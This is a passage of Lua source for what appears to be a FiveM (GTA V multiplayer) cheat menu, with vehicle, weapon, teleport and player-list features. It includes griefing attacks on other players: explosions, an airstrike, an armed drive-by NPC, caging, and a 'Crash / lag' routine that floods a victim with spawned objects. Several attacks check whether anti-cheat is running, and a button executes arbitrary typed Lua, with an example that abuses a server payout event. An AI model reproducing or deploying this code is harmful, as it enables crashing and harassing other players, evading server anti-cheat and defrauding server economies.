            elseif k == 'Paintjob RGB' then
                if v then
                    local vehicle = GetVehiclePedIsUsing(me)
                    if vehicle then
                        SetVehicleCustomPrimaryColour(vehicle, table.unpack(RGB(0.2)))
                        SetVehicleCustomSecondaryColour(vehicle, table.unpack(RGB(0.2)))
                    end
                end
            elseif k == 'Boost vehicle' then
                local vehicle = GetVehiclePedIsUsing(me)
                if vehicle then
                    if v then
                        SetVehicleEnginePowerMultiplier(vehicle, tonumber(v) / 1)
                    else
                        SetVehicleEnginePowerMultiplier(vehicle, 0.0)
                    end
                end
            elseif k == 'Horn boost' then
                if v then
                    local vehicle = GetVehiclePedIsIn(me, false)
                    if DoesEntityExist(vehicle) then
                        if GetPedInVehicleSeat(vehicle, -1) == me then
                            if IsControlPressed(0, 38) then
                                SetVehicleForwardSpeed(vehicle, 750/3.6)
                            end
                        end
                    end
                end
            elseif k == 'Speedometer' then
                local vehicle = GetVehiclePedIsUsing(me)
                if DoesEntityExist(vehicle) then
                    local kmh = math.floor(GetEntitySpeed(vehicle) * 3.6)
                    local color = '~s~'
                    if kmh > 100 then
                        color = '~o~'
                        if kmh > 200 then
                            color = '~r~'
                        end
                    end
                    if v == 'km/h' then
                        local kmh = math.floor(GetEntitySpeed(vehicle) * 3.6)
                        DrawTxt(('%s%s ~s~km/h'):format(color, kmh), 0.95, false, {210, 210, 210}, 0.3, 0.9, true, 0.1)
                    elseif v == 'mph' then
                        local mph = math.floor(GetEntitySpeed(vehicle) * 2.236936)
                        DrawTxt(('%s%s ~s~mph'):format(color, mph), 0.95, false, {210, 210, 210}, 0.3, 0.9, true, 0.1)
                    end
                end
            end
        end
        Wait(0)
    end
end)

local Menus = {
    {MenuTitle, 1},
    {'SELF MENU', 2, 1},
    {'MENU OPTIONS', 3, 1},
    {'SERVER RESOURCES', 4, 3},
    {'CREDITS', 5, 1},
    {'SERVER MENU', 6, 1},
    {'WEAPON OPTIONS', 7, 1},
    {'ESP MENU', 8, 1},
    {'PLAYER LIST', 9, 1},
    {'LOADING...', 10, 9},
    {'ESX', 11, 1},
    {'VEHICLE MENU', 12, 1},
    {'DRIVE TO WAYPOINT', 13, 12},
    {'LOS SANTOS CUSTOMS', 14, 12},
    {'LSC - COSMETICS', 15, 14},
    {'LSC - PERFORMANCE', 16, 14},
    {'VEHICLE SPAWNER', 17, 12},
    {'WEATHER MENU', 18, 1},
    {'WEAPON CUSTOMIZATION', 19, 7},
    {'RESOURCE INFO', 20, 4},
    {'TELEPORT MENU', 21, 2},
    {'ANIMATIONS MENU', 22, 2},
    {'INTERACTSOUND MENU', 23, 6},
}

local SetMenuData = function(data)
    if data['Type'] == 'toggle' then
        rgbenabled = data['Enabled']
    elseif data['Type'] == 'list' then
        if string.find(data['Text'], 'Red') then
            menucolours[1] = data['Current'] - 1
        elseif string.find(data['Text'], 'Green') then
            menucolours[2] = data['Current'] - 1
        elseif string.find(data['Text'], 'Blue') then
            menucolours[3] = data['Current'] - 1
        elseif string.find(data['Text'], 'Alpha') then
            menucolours[4] = data['Current'] - 1
        elseif string.find(data['Text'], 'Delay') then
            menudelay = tonumber(data['Items'][data['Current']])
        end
    end
end

local OnlinePlayer = function(data)
    local pped = GetPlayerPed(GetPlayerFromServerId(currentplayer))
    if data['Text'] == 'Teleport' then
        SetEntityCoords(PlayerPedId(), GetEntityCoords(pped))
        local timer = GetGameTimer() + 5000
        while not HasCollisionLoadedAroundEntity(pped) do
            if timer < GetGameTimer() then
                break
            end
            Wait(0)
            SetEntityCoords(PlayerPedId(), GetEntityCoords(pped))
        end
    elseif data['Text'] == 'Remove all weapons' then
        RemoveAllPedWeapons(pped)
    elseif data['Text'] == 'Give all weapons' then
        for k, v in pairs(weapons) do
            GiveWeaponToPed(pped, GetHashKey(v), 250, false, false)
        end
    elseif data['Text'] == 'Give weapon' then
        GiveWeaponToPed(pped, GetHashKey(data['Items'][data['Current']]), 250, false, false)
    elseif data['Text'] == 'Explode' then
        if data['Items'][data['Current']] == 'silent' then
            AddExplosion(GetEntityCoords(pped), 34, 500.0, false, true, false, false)
        else
            AddExplosion(GetEntityCoords(pped), 34, 500.0, true, false, false, false)
        end
    elseif data['Text'] == 'Give health' then
        CreatePickup(GetHashKey('PICKUP_HEALTH_STANDARD'), GetEntityCoords(pped))
    elseif data['Text'] == 'Give armour' then
        CreatePickup(GetHashKey('PICKUP_ARMOUR_STANDARD'), GetEntityCoords(pped))
    elseif data['Text'] == 'Bring vehicle' then
        CreateThread(function()
            local vehicle = GetVehiclePedIsIn(pped)
            while not NetworkHasControlOfEntity(vehicle) do
                NetworkRequestControlOfEntity(vehicle)
                Wait(0)
            end
            for i = 0, 100 do
                SetEntityCoords(vehicle, GetEntityCoords(PlayerPedId()) + vec3(0.0, 0.0, 3.0))
                Wait(5)
            end
        end)
    elseif data['Text'] == 'Kick from vehicle' then
        ClearPedTasksImmediately(pped)
    elseif data['Text'] == 'Destroy vehicle' then
        CreateThread(function()
            local vehicle = GetVehiclePedIsIn(pped)
            while not NetworkHasControlOfEntity(vehicle) do
                NetworkRequestControlOfEntity(vehicle)
                Wait(0)
            end
            NetworkRequestControlOfEntity(vehicle)
            SetVehicleUndriveable(vehicle, true)
            SetVehicleEngineHealth(vehicle, 0)
            Wait(100)
        end)
        -- {
        --     ['Text'] = 'Bring vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
        -- {
        --     ['Text'] = 'Kick from vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
        -- {
        --     ['Text'] = 'Destroy vehicle',
        --     ['Type'] = 'button',
        --     ['cb'] = OnlinePlayer
        -- },
    elseif data['Text'] == 'Airstrike' then
        if not anticheatrunning then
            CreateThread(function()
                local attack = function(SpawnPosition)
                    local model = GetHashKey('lazer')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local plane = CreateVehicle(model, SpawnPosition, GetEntityHeading(pped), true, true)
                    ControlLandingGear(plane, 1)
                    local model = GetHashKey('u_m_y_abner')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local pilot = CreatePedInsideVehicle(plane, 4, model, -1, true, true)
                    
                    local closethread = GetGameTimer() + 999999
                    local closing = false

                    while true do
                        Wait(750)
                        TaskVehicleDriveToCoord(pilot, plane, GetEntityCoords(pped), 9999.0, 0, GetHashKey('lazer'), 16777216, 1.0, 1)

                        if #(GetEntityCoords(pped).xy - GetEntityCoords(plane).xy) <= 450.0 then
                            if not closing then
                                closing = true
                                closethread = GetGameTimer() + 5000
                            end
                            ShootSingleBulletBetweenCoords(GetOffsetFromEntityInWorldCoords(plane, 0.0, 0.0, -30.0), GetOffsetFromEntityInWorldCoords(pped, 0.0, math.random(-5, 5), -5.0), 5000, 0, GetHashKey("VEHICLE_WEAPON_SPACE_ROCKET"), pilot, true, false, 9000.0)
                        end
                        if closethread <= GetGameTimer() then
                            DeleteEntity(plane)
                            DeleteEntity(pilot)
                            return
                        end
                    end
                end
                for k, v in pairs({
                    vec2(0.0, -1000.0),
                    vec2(0.0, 1000.0),
                    vec2(1000.0, 0.0),
                    vec2(-1000.0, 0.0),
                    vec2(-1000.0, 1000.0),
                    vec2(1000.0, -1000.0),
                    vec2(1000.0, 1000.0),
                    vec2(-1000.0, -1000.0)
                }) do
                    CreateThread(function()
                        attack(GetOffsetFromEntityInWorldCoords(pped, v['x'], v['y'], 1000.0))
                    end)
                    Wait(250)
                end
            end)
        else
            AnticheatWarning()
        end
    elseif data['Text'] == 'Spectate' then
        spectating = true
        currentlyspectating = currentplayer
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'spectat') then
                v['Text'] = 'Stop spectating'
            end
        end

        DestroyCam(cam)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)

        cam = CreateCam('DEFAULT_SCRIPTED_Camera', 1)
        RenderScriptCams(1, 0, 0, 1, 1)
        SetCamActive(cam, true)
        SetFocusEntity(pped)

        CreateThread(function()
            local currOffset = vec3(1.0, -3.0, 2.0)
            while spectating do
                Wait(0)
                local offset = GetOffsetFromEntityInWorldCoords(pped, table.unpack(currOffset))
                SetCamCoord(cam, offset)
                PointCamAtCoord(cam, GetEntityCoords(pped))
            end
            ClearFocus()
        end)
    elseif data['Text'] == 'Slap' then
        CreateThread(function()
            for i = 1, 1000 do
                CreateThread(function()
                    -- local model = GetHashKey('prop_bowling_ball')
                    -- while not HasModelLoaded(model) do
                    --     Wait(0)
                    --     RequestModel(model)
                    -- end
                    
                    -- local object = CreateObject(model, vec3(0.0, 0.0, 0.0), true, true)
                    -- local timer = GetGameTimer() + 500
                    -- while timer >= GetGameTimer() do
                    --     Wait(0)
                    --     if math.random(1, 2) == 1 then
                    --         offset = GetOffsetFromEntityInWorldCoords(pped, 0.0, 0.75, 0.2)
                    --         heading = GetEntityHeading(PlayerPedId()) / 2
                    --     else
                    --         offset = GetOffsetFromEntityInWorldCoords(pped, 0.0, -0.75, 0.2)
                    --         heading = GetEntityHeading(PlayerPedId())
                    --     end
                    --     SetEntityHeading(object, heading)
                    --     SetEntityCoords(object, offset)
                    -- end

                    -- local rot = GetEntityRotation(object)
                    -- SetEntityRotation(object, rot['x'], rot['y'], rot['z'], 1, true)
                    -- SetEntityVelocity(object, GetEntityForwardX(object) * (99999), GetEntityForwardY(object) * (99999), 0.0)

                    -- Wait(250)
                    -- DeleteEntity(object)
                    local model = GetHashKey('t20')
                    while not HasModelLoaded(model) do
                        Wait(0)
                        RequestModel(model)
                    end
                    local car = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -8.0, 0.0), GetEntityHeading(pped), true, true)
                    SetVehicleForwardSpeed(car, 750/3.6)
                    SetEntityVisible(car, false)
                    Wait(250)
                    DeleteEntity(car)
                end)
                Wait(15)
            end
        end)
    elseif data['Text'] == 'Stop spectating' then
        spectating = false
        currentlyspectating = 0
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'spectat') then
                v['Text'] = 'Spectate'
            end
        end

        DestroyCam(cam)
        ClearTimecycleModifier()
        RenderScriptCams(false, false, 0, 1, 0)
    elseif data['Text'] == 'Crash / lag' then
        if not anticheatrunning then
            local ObjectHashes = {
                0x34315488,
                0x6A27FEB1, 0xCB2ACC8,
                0xC6899CDE, 0xD14B5BA3,
                0xD9F4474C, 0x32A9996C,
                0x69D4F974, 0xCAFC1EC3,
                0x79B41171, 0x1075651,
                0xC07792D4, 0x781E451D,
                0x762657C6, 0xC2E75A21,
                0xC3C00861, 0x81FB3FF0,
                0x45EF7804, 0xE65EC0E4,
                0xE764D794, 0xFBF7D21F,
                0xE1AEB708, 0xA5E3D471,
                0xD971BBAE, 0xCF7A9A9D,
                0xC2CC99D8, 0x8FB233A4,
                0x24E08E1F, 0x337B2B54,
                0xB9402F87, 0x4F2526DA
            }

            if #(GetEntityCoords(pped) - GetEntityCoords(PlayerPedId())) < 1000 then
                SetEntityCoords(PlayerPedId(), GetEntityCoords(pped) + vec3(1250, 1250, 1000))
            end

            for k, v in pairs(ObjectHashes) do
                while not HasModelLoaded(v) do
                    RequestModel(v)
                    Wait(0)
                end
                CreateObject(v, GetEntityCoords(pped), true, true, true)
            end
        else
            AnticheatWarning()
        end
    elseif data['Text'] == 'Cage' then
        if not anticheatrunning then
            local model = GetHashKey('prop_fnclink_05crnr1')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            local obj = CreateObject(model, GetEntityCoords(pped) + vec3(-1.7, -1.7, -1.0), true, true, true)
            table.insert(spawnedprops, obj)
            SetEntityHeading(obj, -90.0)
            FreezeEntityPosition(obj, true)
            obj = CreateObject(model, GetEntityCoords(pped) + vec3(1.7, 1.7, -1.0), true, true, true)
            table.insert(spawnedprops, obj)
            SetEntityHeading(obj, 90.0)
            FreezeEntityPosition(obj, true)
        else
            AnticheatWarning()
        end
    elseif data['Text'] == 'Allahu akbar' then
        local model = GetHashKey('mp_m_freemode_01')
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end

        local ped = CreatePed(5, model, GetOffsetFromEntityInWorldCoords(pped, 0.0, -1.0, -1.0), GetEntityHeading(pped), true, true)
        
        SetPedDefaultComponentVariation(ped)
        SetPedHeadBlendData(ped, 1, 1, 1, 2, 2, 2, 1.0, 1.0, 1.0, true)
        SetPedComponentVariation(ped, 1, 115, 0, 2)
        SetPedComponentVariation(ped, 3, 4, 0, 2)
        SetPedComponentVariation(ped, 11, 12, 0, 2)
        SetPedComponentVariation(ped, 8, 15, 0, 2)
        SetPedComponentVariation(ped, 4, 56, 0, 2)
        SetPedComponentVariation(ped, 6, 34, 0, 2)
        
        CreateThread(function()
            PlayPain(ped, 6, 0, 0)
            Wait(500)
            AddExplosion(GetEntityCoords(ped), 34, 500.0, true, false, false, false)
        end)
    elseif data['Text'] == 'Drive-by [ped]' then
        CreateThread(function() 
            local found, coords = GetClosestVehicleNode(table.unpack(GetEntityCoords(pped)), 1)
            while not found do
                found, coords = GetClosestVehicleNode(table.unpack(GetEntityCoords(pped)), 1)
                Wait(250)
            end

            local model = GetHashKey('baller')
            
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            print(coords)
            local veh = CreateVehicle(model, coords, 0.0, true, true)

            local model = GetHashKey('u_m_y_abner')
            while not HasModelLoaded(model) do
                Wait(0)
                RequestModel(model)
            end
            
            local driver = CreatePedInsideVehicle(veh, 4, model, -1, true, true)
            GiveWeaponToPed(driver, GetHashKey('WEAPON_PISTOL50'), 250, false, true)
            SetPedInfiniteAmmo(driver, true, GetHashKey('WEAPON_PISTOL50'))
            SetPedInfiniteAmmoClip(driver, true)
            local closethread = GetGameTimer() + 999999
            local closing = false
            TaskVehicleFollow(driver, veh, pped, 40.0, 262144, 10)

            while true do
                Wait(750)

                print(#(GetEntityCoords(pped).xy - GetEntityCoords(driver).xy))

                if #(GetEntityCoords(pped).xy - GetEntityCoords(driver).xy) <= 50.0 and HasEntityClearLosToEntity(driver, pped, 17) then
                    if not closing then
                        closing = true
                        closethread = GetGameTimer() + 25000
                    end
                end

                if closing then
                    TaskCombatPed(driver, pped, 0, 16)
                    SetPedCombatAttributes(driver, 3, false)
                    SetPedCombatAttributes(driver, 0, false)
                    if IsPedDeadOrDying(pped) then
                        closethread = 0
                    end
                end

                if closethread <= GetGameTimer() then
                    ClearPedTasks(driver)
                    TaskVehicleDriveWander(driver, veh, 40.0, 262144)

                    SetTimeout(15000, function()
                        DeleteEntity(driver)
                        DeleteEntity(veh)
                    end)
                    return
                end
            end
        end)
    elseif data['Text'] == 'Set as friend' then
        friends[currentplayer] = true
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'friend') then
                v['Text'] = 'Remove friend'
            end
        end
    elseif data['Text'] == 'Remove friend' then
        friends[currentplayer] = false
        for k, v in pairs(Objects[10]) do
            if string.find((v['Text']):lower(), 'friend') then
                v['Text'] = 'Set as friend'
            end
        end
    end
end

local SpawnVehicle = function(data)
    CreateThread(function()
        local model = GetHashKey(data['Items'][data['Current']])
        while not HasModelLoaded(model) do
            Wait(0)
            RequestModel(model)
        end
        local car = CreateVehicle(model, GetOffsetFromEntityInWorldCoords(PlayerPedId(), -4.0, 2.0, 0.0), GetEntityHeading(PlayerPedId()), true, true)
        SetVehicleNeedsToBeHotwired(car, false)
        SetVehRadioStation(car, 'OFF')
        SetVehicleDirtLevel(car, 0.0)

        if Toggles['Enter car when spawning'] then
            SetEntityCoords(car, GetEntityCoords(PlayerPedId()))
            TaskWarpPedIntoVehicle(PlayerPedId(), car, -1)
        end
    end)
end

local CarMenu = function(data)
    local txt = data['Text']:lower()
    local vehicle = GetVehiclePedIsUsing(PlayerPedId())
    if string.find(data['Text']:lower(), ('custom input'):lower()) then
        local veh = KeyboardInput('What car do you want to spawn?', '', 30)
        if veh then
            SpawnVehicle({['Items'] = {veh}, ['Current'] = 1})
        end
    elseif string.find(txt, ('neon lights')) then
        if data['Type'] == 'toggle' then
            if DoesEntityExist(vehicle) then
                for i = 0, 3 do
                    SetVehicleNeonLightEnabled(vehicle, i, data['Enabled'])
                end
            end
        end
    elseif txt == 'neon rgb' or txt == 'paintjob rgb' or txt == 'horn boost' then
        Toggles[data['Text']] = data['Enabled']
    elseif txt == 'set vehicle plate text' then
        local veh = GetVehiclePedIsUsing(PlayerPedId())
        if veh then
            if DoesEntityExist(veh) then
                local plate = KeyboardInput('What plate do you want?', '', 8)
                if plate then
                    SetVehicleNumberPlateText(veh, plate)
                end
            else
                Alert('You are not sitting in a vehicle.')
            end
        else
            Alert('You are not sitting in a vehicle.')
        end
    elseif txt == 'boost vehicle' then
        Toggles['Boost vehicle'] = data['Items'][data['Current']]
    elseif txt == 'speed (km/h)' then
        autodrivespeed = data['Items'][data['Current']]
    elseif txt == 'repair car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleFixed(vehicle)
        end
    elseif txt == 'stealth repair' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleEngineHealth(vehicle, 1000.0)
            SetVehicleBodyHealth(vehicle, 1000.0)
            SetVehiclePetrolTankHealth(vehicle, 1000.0)
            SetVehicleOilLevel(vehicle, 1000.0)
        end
    elseif txt == 'wash car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        if vehicle then
            SetVehicleDirtLevel(vehicle, 0.0)
        end
    elseif txt == 'unlock closest car' then
        local vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
        if vehicle then
            if DoesEntityExist(vehicle) then
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleDoorsLockedForPlayer(vehicle, PlayerId(), false)
                SetVehicleDoorsLockedForAllPlayers(vehicle, false)
            end
        end
    elseif txt == 'delete car' then
        local vehicle = GetVehiclePedIsUsing(PlayerPedId()) 
        local delete = function(vehicle)
            CreateThread(function()
                while DoesEntityExist(vehicle) do
                    while not NetworkHasControlOfEntity(vehicle) do
                        NetworkRequestControlOfEntity(vehicle)
                        Wait(0)
                    end
                    SetEntityAsMissionEntity(vehicle, true, true)
                    DeleteEntity(vehicle)
                    Wait(100)
                end
            end)
        end
        if DoesEntityExist(vehicle) then
            delete(vehicle)
        else
            vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 15.0, 0, 70)
            if vehicle then
                delete(vehicle)
            end
        end
    elseif txt == 'speedometer' then
        Toggles[data['Text']] = data['Items'][data['Current']]
    end
end

local AutoDrive = function()
    while true do
        Wait(0)
        if Toggles['Drive to waypoint'] then
            local vehicle = GetVehiclePedIsUsing(PlayerPedId())
            if DoesEntityExist(vehicle) then
                local coords = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
                TaskVehicleDriveToCoord(PlayerPedId(), vehicle, coords, GetVehicleMaxSpeed(vehicle), 0, -1848994066, 263100, 10.0)
                SetDriveTaskDrivingStyle(PlayerPedId(), 263100)       
                SetPedKeepTask(PlayerPedId(), true)
                while Toggles['Drive to waypoint'] do
                    Wait(0)
                    SetEntityMaxSpeed(vehicle, (autodrivespeed + 1) / 3.6)
                    if GetPedInVehicleSeat(vehicle, -1) == PlayerPedId() then
                        if GetDistanceBetweenCoords(coords, GetEntityCoords(PlayerPedId()), false) <= 25.0 then
                            Toggles['Drive to waypoint'] = false
                            ClearPedTasks(PlayerPedId())
                            ClearPedSecondaryTask(PlayerPedId())
                        end
                    else
                        Toggles['Drive to waypoint'] = false
                    end
                end
                ClearPedTasks(PlayerPedId())
                ClearPedSecondaryTask(PlayerPedId())

                SetEntityMaxSpeed(vehicle, GetVehicleMaxSpeed(vehicle))
            end
        end
    end
end

local PlayerBlips = function(data)
    Toggles['PlayerBlips'] = data['Enabled']

    for k, v in pairs(playerblips) do
        RemoveBlip(v)
    end

    if data['Enabled'] then
        for k, v in pairs(GetActivePlayers()) do
            local pped = GetPlayerPed(v)
            playerblips[v] = AddBlipForCoord(GetEntityCoords(pped))
            SetBlipAsShortRange(blip, true)

            BeginTextCommandSetBlipName('STRING')
            AddTextComponentString(GetPlayerName(v) .. ' | ' .. GetPlayerServerId(v))
            EndTextCommandSetBlipName(playerblips[v])
        end
    end
end

local WeatherMenu = function(data)
    if data['Text'] == 'Lock time' then
        Toggles['Lock time'] = data['Enabled']
        hourlocked = GetClockHours()
    elseif data['Text'] == 'Set hour of day' then
        hourlocked = tonumber(data['Items'][data['Current']])
        NetworkOverrideClockTime(hourlocked, 0, 0)
    elseif data['Text'] == 'Set weather' then
        weatherlocked = data['Items'][data['Current']]
        if weatherlocked ~= 'NONE' then
            Toggles['Lock weather'] = true
        else
            Toggles['Lock weather'] = false
        end
    end
end

local Crash = function()
    while true do
    end
end

local customizations = {
    ['Special finish'] = {0x27872C90, 0xD7391086, 0x9B76C72C, 0x487AAE09, 0x85A64DF9, 0x377CD377, 0xD89B9658, 0x4EAD7533, 0x4032B5E7, 0x77B8AB2F, 0x7A6A7B7B, 0x161E9241},
    ['Suppressor'] = {0x65EA7EBB, 0x837445AA, 0xA73D4664, 0xC304849A, 0xE608B35E},
    ['Scope'] = {0x9D2FBF29, 0xA0D89C42, 0xAA2C45B4, 0xD2443DDC, 0x3CC6BA57, 0x3C00AFED},
    ['Flashlight'] = {0x359B7AAE, 0x4A4965F3, 0x43FD595B, 0x7BC4CDDC},
    ['Grip'] = {0xC164F53, 0x9D65907A}
}

local WeaponCustomization = function(data)
    local txt, type = data['Text'], data['Items'][data['Current']]
    if customizations[txt] then
        for k, v in pairs(customizations[txt]) do
            if type == 'add' then
                GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), v)
            else
                RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), v)
            end
        end
    else
        if txt == 'Tint' then
            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), data['Current'] - 1)
        end
    end
end

local AnimationsMenu = function(data)
    if data['Type'] == 'list' then
        local anim = animations[data['Items'][data['Current']]]
        if anim then
            if anim['Type'] == 'animation' then
                CreateThread(function()
                    while not HasAnimDictLoaded(anim['Dict']) do 
                        Wait(0)
                        RequestAnimDict(anim['Dict'])
                    end
                    TaskPlayAnim(PlayerPedId(), anim['Dict'], anim['Anim'], 8.0, -8.0, -1, anim['Flag'], 0, false, false, false)
                end)
            elseif anim['Type'] == 'scenario' then
                TaskStartScenarioInPlace(PlayerPedId(), anim['Anim'], 0, false)
            elseif anim['Type'] == 'walking_style' then
                CreateThread(function()
                    while not HasAnimDictLoaded(anim['Anim']) do 
                        Wait(0)
                        RequestAnimDict(anim['Anim'])
                    end
                    SetPedMovementClipset(PlayerPedId(), anim['Anim'], true)
                end)
            end
        end
    else
        if data['Text'] == 'Cancel animation' then
            ClearPedTasksImmediately(PlayerPedId())
        end
    end
end

local CustomCode = function()
    menuvisible = false
    local code = KeyboardInput('Type your code, e.g TriggerServerEvent("esx_truckerjob:pay", 25)', '', 999)
    if code then
        CreateThread(function()
            load(code)()
        end)
    end
    menuvisible = true
end

local PlayInteractSound = function(data)
    if data['Text'] == 'Play on all' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', data['Items'][data['Current']], 1.0)
    elseif data['Text'] == 'Play sound on player' then
        TriggerServerEvent('InteractSound_SV:PlayOnOne', currentplayer, data['Items'][data['Current']], 1.0)
    elseif data['Text'] == 'Cancel sound (self)' then
        TriggerEvent('InteractSound_CL:PlayOnOne', interactsoundaudios[1], 0.0)
    elseif data['Text'] == 'Cancel sound (all)' then
        TriggerServerEvent('InteractSound_SV:PlayOnAll', interactsoundaudios[1], 0.0)
    end
end

RegisterNetEvent('InteractSound_CL:PlayOnAll')
AddEventHandler('InteractSound_CL:PlayOnAll', function()
    print('Interactsound: someone started playing a sound')
    if Toggles['Interactsound blocker'] then
        Wait(50)
        print('Interactsound: blocked sound')
        TriggerEvent('InteractSound_CL:PlayOnOne', interactsoundaudios[1], 0.0)
    end
end)

Objects = {
    {
        {
            ['Text'] = 'Self menu',
            ['Type'] = 'menu',
            ['Menu'] = 2
        },
        {
            ['Text'] = 'Weapon menu',
            ['Type'] = 'menu',
            ['Menu'] = 7
        },
        {
            ['Text'] = 'Extra sensory perception',
            ['Type'] = 'menu',
            ['Menu'] = 8,
        },
        {
            ['Text'] = 'Player menu',
            ['Type'] = 'menu',
            ['Menu'] = 9
        },
        {
            ['Text'] = 'Server menu',
            ['Type'] = 'menu',
            ['Menu'] = 6
        },
        {
            ['Text'] = 'Vehicle menu',
            ['Type'] = 'menu',
            ['Menu'] = 12
        },
        {
            ['Text'] = 'Weather menu',
            ['Type'] = 'menu',
            ['Menu'] = 18
        },
        {
            ['Text'] = 'Menu options + server info',
            ['Type'] = 'menu',
            ['Menu'] = 3
        },
        {
            ['Text'] = 'ESX menu',
            ['Type'] = 'menu',
            ['Menu'] = 11
        },
        {
            ['Text'] = 'Trigger custom code',
            ['Type'] = 'button',
            ['cb'] = CustomCode
        },
        {
            ['Text'] = 'Credits',
            ['Type'] = 'menu',
            ['Menu'] = 5
        },
        -- {
        --     ['Text'] = 'Crash',
        --     ['Type'] = 'button',
        --     ['cb'] = Crash
        -- },
    },
    {
        {
            ['Text'] = 'Teleport menu →',
            ['Type'] = 'menu',
            ['Menu'] = 21,
        },
        {
            ['Text'] = 'Animations menu →',
            ['Type'] = 'menu',
            ['Menu'] = 22,
        },
        {
            ['Text'] = 'Outfit',
            ['Type'] = 'list',
            ['Items'] = {
                'Random',
                'troll 1',
                'troll 2',
                'troll 3',
                'troll 4',
                'troll 5',
                'Legit 1',
                'Legit 2',
                'Legit 3',
                'Legit 4'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Godmode',
            ['Type'] = 'list',
            ['Items'] = {
                'off',
                'safe',
                'godmode'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Effect',
            ['Type'] = 'list',
            ['Items'] = {
                'none',
                'drunk',
                'high',
            },
            ['Current'] = 1,
            ['cb'] = EnableEffect
        },
        {
            ['Text'] = 'Refill',
            ['Type'] = 'list',
            ['Items'] = {
                'health',
                'armour'
            },
            ['Current'] = 1,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Noclip',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress 
        },
        {
            ['Text'] = 'Invisible',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Infinite stamina',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'No ragdoll',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Shrink ped',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Super run',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Super jump',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Radar',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Delete attached',
            ['Type'] = 'button',
            ['cb'] = MenuPress,
        },
        {
            ['Text'] = 'Suicide',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Revive',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Back',
            ['Type'] = 'menu',
            ['Menu'] = 1
        },
    }, 
    {
        {
            ['Text'] = 'Server ip: ' .. GetCurrentServerEndpoint(),
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Server resources: ' .. GetNumResources() .. ' →',
            ['Type'] = 'menu',
            ['Menu'] = 4,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Menu X offset',
            ['Type']  = 'list',
            ['Items'] = {
                '0.1', '0.15', '0.2', '0.25', '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.75', '0.8', '0.85', '0.9'
            },
            ['Current'] = 1,
            ['cb'] = SetMenuOffsets
        },
        {
            ['Text'] = 'Menu Y offset',
            ['Type']  = 'list',
            ['Items'] = {
                '0.3', '0.35', '0.4', '0.45', '0.5', '0.55', '0.6', '0.65', '0.7', '0.745',
            },
            ['Current'] = 1,
            ['cb'] = SetMenuOffsets
        },
        {
            ['Text'] = 'Menu sounds',
            ['Type'] = 'toggle',
            ['Enabled'] = true,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Show coords',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Show toggles',
            ['Type'] = 'toggle',
            ['Enabled'] = false,
            ['cb'] = MenuPress
        },
        {
            ['Text'] = 'Menu RGB',
            ['Type']  = 'toggle',
            ['Enabled'] = true,
            ['cb'] = SetMenuData
        },
        {
            ['Text'] = 'Menu Red',
            ['Type'] = 'list',
            ['Items'] = {
